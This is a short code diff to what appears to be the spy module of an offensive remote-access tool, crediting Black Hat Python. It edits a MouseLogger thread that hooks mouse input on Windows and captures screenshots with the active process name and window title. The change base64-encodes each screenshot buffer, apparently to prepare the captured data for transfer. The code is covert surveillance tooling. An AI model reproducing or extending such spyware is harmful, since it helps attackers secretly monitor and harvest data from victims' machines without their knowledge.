@@ -7,6 +7,7 @@ from ctypes.wintypes import DWORD
 import threading
 import time
 import datetime
+import base64
 
 from ctypes import (
     byref, memset, pointer, sizeof, windll,
@@ -198,7 +199,7 @@ class MouseLogger(threading.Thread):
                 exe, win_title=get_current_process()
             except Exception:
                 pass
-            self.screenshots.append((datetime.datetime.now(), height, width, exe, win_title, buf))
+            self.screenshots.append((str(datetime.datetime.now()), height, width, exe, win_title, base64.b64encode(buf)))
         return user32.CallNextHookEx(self.hooked, nCode, wParam, lParam)
 
 #credit: Black Hat Python - https://www.nostarch.com/blackhatpython
